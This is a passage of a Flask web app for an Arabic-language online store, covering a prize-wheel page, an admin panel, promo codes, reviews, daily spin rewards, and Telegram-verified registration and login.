  { label: '20 جنيه 🎁', color: '#ff9100', amount: 20, discount: 0 },
  { label: 'حظ أوفر 😅', color: '#263d70', amount: 0, discount: 0 }
];

const numItems = items.length;
const arc = (2 * Math.PI) / numItems;

function drawWheel() {
  const radius = canvas.width / 2;
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  for (let i = 0; i < numItems; i++) {
    const angle = i * arc;
    ctx.beginPath();
    ctx.fillStyle = items[i].color;
    ctx.moveTo(radius, radius);
    ctx.arc(radius, radius, radius - 10, angle, angle + arc);
    ctx.lineTo(radius, radius);
    ctx.fill();
    ctx.save();
    ctx.translate(radius, radius);
    ctx.rotate(angle + arc / 2);
    ctx.textAlign = "right";
    ctx.fillStyle = "#ffffff";
    ctx.font = "bold 20px Cairo";
    ctx.fillText(items[i].label, radius - 40, 8);
    ctx.restore();
  }
}
drawWheel();

let isSpinning = false;
spinBtn.addEventListener('click', () => {
  if (isSpinning) return;
  isSpinning = true;
  spinBtn.disabled = true;
  playSpinSound();

  fetch('/spin', {method: 'POST'}).then(res => res.json()).then(data => {
    if (data.status === 'error') {
      isSpinning = false;
      spinBtn.disabled = false;
      document.getElementById('prizeTitle').textContent = 'عذراً!';
      document.getElementById('prizeDesc').textContent = data.message;
      resultModal.style.display = 'grid';
      return;
    }

    const selectedIndex = data.index;
    const prize = items[selectedIndex];
    const targetDegree = (360 - (selectedIndex * (360 / numItems)) - ((360 / numItems) / 2)) + (360 * 6);
    canvas.style.transform = `rotate(${targetDegree}deg)`;

    setTimeout(() => {
      isSpinning = false;
      document.getElementById('prizeTitle').textContent = (prize.amount > 0 || prize.discount > 0) ? '🎉 مبروك!' : '😅 حظ أوفر!';
      document.getElementById('prizeDesc').textContent = data.msg;
      resultModal.style.display = 'grid';
    }, 6000);
  });
});
</script>
</body>
</html>
"""

# ==================== المسارات واللوجو وملفات الأرشفة ====================

@app.route('/logo.svg')
@app.route('/favicon.ico')
def serve_logo():
    svg_logo = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="100%" height="100%">
  <defs>
    <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#03091b"/>
      <stop offset="100%" stop-color="#081738"/>
    </linearGradient>
    <linearGradient id="nGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#bc5bff"/>
      <stop offset="50%" stop-color="#315dff"/>
      <stop offset="100%" stop-color="#35eaa1"/>
    </linearGradient>
  </defs>
  <rect width="512" height="512" rx="120" fill="url(#bgGrad)"/>
  <path d="M 120 120 L 200 120 L 312 312 L 312 120 L 392 120 L 392 392 L 312 392 L 200 200 L 200 392 L 120 392 Z" fill="url(#nGrad)"/>
</svg>"""
    return Response(svg_logo, mimetype='image/svg+xml')

@app.route('/robots.txt')
def robots():
    robots_content = """User-agent: *
Allow: /

Sitemap: https://elite-store-ug21.onrender.com/sitemap.xml
"""
    return Response(robots_content, mimetype='text/plain')

@app.route('/sitemap.xml')
def sitemap():
    sitemap_xml = """<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>https://elite-store-ug21.onrender.com/</loc>
    <lastmod>2026-10-20</lastmod>
    <changefreq>daily</changefreq>
    <priority>1.0</priority>
  </url>
</urlset>"""
    return Response(sitemap_xml, mimetype='application/xml')

@app.route('/manifest.json')
def manifest():
    return send_from_directory('static', 'manifest.json')

@app.route("/apply_promo", methods=["POST"])
def apply_promo():
    data = request.get_json() or {}
    code_input = data.get("code", "").strip().upper()
    if not code_input:
        return jsonify({"status": "error", "message": "يرجى إدخال كود الخصم."})

    with get_db() as db:
        promo = db.execute("SELECT * FROM promo_codes WHERE code = ? AND active = 1", (code_input,)).fetchone()
        if promo:
            session['active_discount'] = promo["discount_percent"]
            return jsonify({
                "status": "success",
                "discount_percent": promo["discount_percent"],
                "message": f"تم تطبيق كود الخصم ({promo['discount_percent']}%) بنجاح وتم تحديث الأسعار!"
            })
        else:
            return jsonify({"status": "error", "message": "كود الخصم غير صحيح أو منتهي الصلاحية."})

@app.route("/admin")
def admin_panel():
    email = session.get("user_email")
    if not email or email != ADMIN_EMAIL:
        return redirect(url_for("home"))
    flash_msg = get_setting("flash_msg", "عروض الساعات المحدودة!")
    vodafone_number = get_setting("vodafone_number", "01000000000")
    products = get_products()
    posts = get_posts()
    promo_codes = get_promo_codes()
    return render_template_string(
        ADMIN_PANEL_PAGE, 
        flash_msg=flash_msg, 
        vodafone_number=vodafone_number, 
        products=products,
        posts=posts,
        promo_codes=promo_codes
    )

@app.route("/admin/add_promo", methods=["POST"])
def admin_add_promo():
    email = session.get("user_email")
    if not email or email != ADMIN_EMAIL:
        return redirect(url_for("home"))
    code = request.form.get("code", "").strip().upper()
    discount_percent = float(request.form.get("discount_percent", 0))
    if code and discount_percent > 0:
        with get_db() as db:
            db.execute("INSERT OR REPLACE INTO promo_codes (code, discount_percent, active) VALUES (?, ?, 1)", (code, discount_percent))
    return redirect(url_for("admin_panel"))

@app.route("/admin/delete_promo/<int:promo_id>")
def admin_delete_promo(promo_id):
    email = session.get("user_email")
    if not email or email != ADMIN_EMAIL:
        return redirect(url_for("home"))
    with get_db() as db:
        db.execute("DELETE FROM promo_codes WHERE id = ?", (promo_id,))
    return redirect(url_for("admin_panel"))

@app.route("/admin/add_post", methods=["POST"])
def admin_add_post():
    email = session.get("user_email")
    if not email or email != ADMIN_EMAIL:
        return redirect(url_for("home"))

    title = request.form.get("title", "").strip()
    content = request.form.get("content", "").strip()
    link_url = request.form.get("link_url", "").strip()

    image_url = ""
    file = request.files.get("image_file")
    if file and file.filename != '':
        filename = secure_filename(file.filename)
        unique_filename = f"post_{int(time.time())}_{filename}"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
        file.save(filepath)
        image_url = f"/static/uploads/{unique_filename}"

    if title and content:
        with get_db() as db:
            db.execute("""
                INSERT INTO posts (title, content, image_url, link_url, created_at)
                VALUES (?, ?, ?, ?, ?)
            """, (title, content, image_url, link_url, int(time.time())))

    return redirect(url_for("admin_panel"))

@app.route("/admin/delete_post/<int:post_id>")
def admin_delete_post(post_id):
    email = session.get("user_email")
    if not email or email != ADMIN_EMAIL:
        return redirect(url_for("home"))
    with get_db() as db:
        db.execute("DELETE FROM posts WHERE id = ?", (post_id,))
    return redirect(url_for("admin_panel"))

@app.route("/admin/update_vodafone", methods=["POST"])
def admin_update_vodafone():
    email = session.get("user_email")
    if not email or email != ADMIN_EMAIL:
        return redirect(url_for("home"))
    num = request.form.get("vodafone_number", "").strip()
    with get_db() as db:
        db.execute("INSERT OR REPLACE INTO store_settings (key, value) VALUES ('vodafone_number', ?)", (num,))
    return redirect(url_for("admin_panel"))

@app.route("/admin/update_flash", methods=["POST"])
def admin_update_flash():
    email = session.get("user_email")
    if not email or email != ADMIN_EMAIL:
        return redirect(url_for("home"))
    msg = request.form.get("flash_msg", "")
    with get_db() as db:
        db.execute("INSERT OR REPLACE INTO store_settings (key, value) VALUES ('flash_msg', ?)", (msg,))
    return redirect(url_for("admin_panel"))

@app.route("/admin/add_product", methods=["POST"])
def admin_add_product():
    email = session.get("user_email")
    if not email or email != ADMIN_EMAIL:
        return redirect(url_for("home"))

    name = request.form.get("name")
    description = request.form.get("description")
    price_val = float(request.form.get("price_val", 0))
    price = request.form.get("price")
    code = request.form.get("code")
    icon = request.form.get("icon")
    category = request.form.get("category")
    badge = request.form.get("badge")

    image_url = ""
    file = request.files.get("image_file")
    if file and file.filename != '':
        filename = secure_filename(file.filename)
        unique_filename = f"{int(time.time())}_{filename}"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
        file.save(filepath)
        image_url = f"/static/uploads/{unique_filename}"

    with get_db() as db:
        db.execute("""
            INSERT INTO products (name, description, price_val, price, code, icon, image_url, category, color, badge)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, '#315dff', ?)
        """, (name, description, price_val, price, code, icon, image_url, category, badge))

    return redirect(url_for("admin_panel"))

@app.route("/admin/delete_product/<int:prod_id>")
def admin_delete_product(prod_id):
    email = session.get("user_email")
    if not email or email != ADMIN_EMAIL:
        return redirect(url_for("home"))
    with get_db() as db:
        db.execute("DELETE FROM products WHERE id = ?", (prod_id,))
    return redirect(url_for("admin_panel"))

@app.route("/add_review", methods=["POST"])
def add_review():
    user_name = request.form.get("user_name", "عميل المتجر").strip()
    rating = int(request.form.get("rating", 5))
    comment = request.form.get("comment", "").strip()
    if comment:
        with get_db() as db:
            db.execute("INSERT INTO reviews (user_name, rating, comment, created_at) VALUES (?, ?, ?, ?)",
                       (user_name, rating, comment, int(time.time())))
    return redirect(url_for("home"))

@app.route("/spin", methods=["GET", "POST"])
def spin():
    email = session.get("user_email")
    if not email:
        return redirect(url_for("login"))

    with get_db() as db:
        user = db.execute("SELECT * FROM users WHERE email = ?", (email,)).fetchone()

    today_str = time.strftime("%Y-%m-%d")
    if request.method == "POST":
        if user["last_spin_date"] == today_str:
            return jsonify({"status": "error", "message": "لقد استخدمت محاولتك اليومية! عُد غداً لفرصة جديدة 🎁"})

        selectedIndex = secrets.randbelow(6)
        prizes = [
            {'label': '5 جنيه 💰', 'amount': 5, 'discount': 0},
            {'label': 'حظ أوفر 😅', 'amount': 0, 'discount': 0},
            {'label': '10 جنيه 💳', 'amount': 10, 'discount': 0},
            {'label': 'خصم 20% 🏷️', 'amount': 0, 'discount': 20},
            {'label': '20 جنيه 🎁', 'amount': 20, 'discount': 0},
            {'label': 'حظ أوفر 😅', 'amount': 0, 'discount': 0}
        ]
        prize = prizes[selectedIndex]

        with get_db() as db:
            if prize['amount'] > 0:
                db.execute("UPDATE users SET balance = balance + ?, last_spin_date = ?, spin_count = spin_count + 1 WHERE email = ?", (prize['amount'], today_str, email))
            else:
                db.execute("UPDATE users SET last_spin_date = ?, spin_count = spin_count + 1 WHERE email = ?", (today_str, email))

        if prize['discount'] > 0:
            session['active_discount'] = prize['discount']
            msg = f"مبروك! فزت بـ ({prize['label']}) وتم خفض جميع أسعار المتجر فوراً بنسبة {prize['discount']}%!"
        elif prize['amount'] > 0:
            msg = f"مبروك! فزت بـ ({prize['label']}) وأضيفت لمحفظتك."
        else:
            msg = "حاول مجدداً غداً."

        return jsonify({"status": "success", "index": selectedIndex, "msg": msg})

    return render_template_string(SPIN_PAGE)

@app.route("/register", methods=["GET", "POST"])
def register():
    error = ""
    step = 1
    if request.method == "POST":
        if "code" not in request.form:
            name = request.form.get("name", "").strip()
            email = request.form.get("email", "").strip().lower()
            password = request.form.get("password", "")
            telegram_id = request.form.get("telegram_id", "").strip()

            if not name or "@" not in email or len(password) < 6 or not telegram_id:
                error = "يرجى ملء جميع البيانات بشكل صحيح."
            else:
                with get_db() as db:
                    existing = db.execute("SELECT id FROM users WHERE email = ?", (email,)).fetchone()
                    if existing:
                        error = "هذا البريد مسجل مسبقاً."
                    else:
                        code = str(secrets.randbelow(900000) + 100000)
                        db.execute("INSERT OR REPLACE INTO email_codes (email, code, expires_at) VALUES (?, ?, ?)",
                                   (email, code, int(time.time()) + 300))
                        send_telegram_code(telegram_id, code)
                        session["temp_reg"] = {"name": name, "email": email, "password": generate_password_hash(password), "telegram_id": telegram_id}
                        step = 2
        else:
            entered_code = request.form.get("code", "").strip()
            temp = session.get("temp_reg")
            if not temp:
                return redirect(url_for("register"))
            with get_db() as db:
                record = db.execute("SELECT * FROM email_codes WHERE email = ?", (temp["email"],)).fetchone()
                if record and record["code"] == entered_code:
                    my_ref = "REF" + str(secrets.randbelow(899999) + 100000)
                    db.execute("""
                        INSERT INTO users (name, email, password_hash, telegram_id, balance, verified, ref_code, created_at)
                        VALUES (?, ?, ?, ?, 0.0, 1, ?, ?)
                    """, (temp["name"], temp["email"], temp["password"], temp["telegram_id"], my_ref, int(time.time())))
                    session["user_email"] = temp["email"]
                    session.pop("temp_reg", None)
                    return redirect(url_for("account"))
                else:
                    error = "كود التحقق غير صحيح."
                    step = 2
    return render_template_string(REGISTER_PAGE, error=error, step=step)

@app.route("/login", methods=["GET", "POST"])
def login():
    error = ""
    if request.method == "POST":
        email = request.form.get("email", "").strip().lower()
        password = request.form.get("password", "")
        with get_db() as db:
            user = db.execute("SELECT * FROM users WHERE email = ?", (email,)).fetchone()
        if user and check_password_hash(user["password_hash"], password):
            session["user_email"] = email
            return redirect(url_for("account"))
        error = "بيانات الدخول غير صحيحة."
    return render_template_string(LOGIN_PAGE, error=error)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("home"))

@app.route("/account")
def account():
    email = session.get("user_email")
    if not email:
        return redirect(url_for("login"))
    with get_db() as db:
        user = db.execute("SELECT * FROM users WHERE email = ?", (email,)).fetchone()
    return render_template_string(ACCOUNT_PAGE, user=user)

@app.route("/update_profile", methods=["POST"])
def update_profile():
    email = session.get("user_email")
    if not email:
        return redirect(url_for("login"))
    status_title = request.form.get("status_title", "عضو مميز").strip()
    avatar_preset = request.form.get("avatar_preset")
    avatar_url = request.form.get("avatar_url", "").strip()
    final_avatar = avatar_url or avatar_preset or "🤖"

    file = request.files.get("avatar_file")
    if file and file.filename != '':
        filename = secure_filename(file.filename)
        unique_filename = f"avatar_{int(time.time())}_{filename}"
        filepath = os.path.join(app.config['AVATARS_FOLDER'], unique_filename)
        file.save(filepath)
        final_avatar = f"/static/avatars/{unique_filename}"

    with get_db() as db:
        db.execute("UPDATE users SET avatar = ?, status_title = ? WHERE email = ?", (final_avatar, status_title, email))
    return redirect(url_for("account"))

@app.route("/")
def home():
    email = session.get("user_email")
    user = None
    is_admin = False
    if email:
        with get_db() as db:
            user = db.execute("SELECT * FROM users WHERE email = ?", (email,)).fetchone()
        is_admin = (email == ADMIN_EMAIL)
    products = get_products()
    reviews = get_reviews()
    posts = get_posts()
    flash_msg = get_setting("flash_msg", "عروض الساعات المحدودة!")
    vodafone_number = get_setting("vodafone_number", "01000000000")

    return render_template_string(
        PAGE, 
        products=products, 
        reviews=reviews,
        posts=posts,
        flash_msg=flash_msg,
        user=user, 
        is_admin=is_admin, 
        admin_telegram=ADMIN_TELEGRAM_USERNAME, 
        telegram_bot=TELEGRAM_BOT_USERNAME,
        telegram_channel=TELEGRAM_CHANNEL_LINK,
        vodafone_number=vodafone_number
    )


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
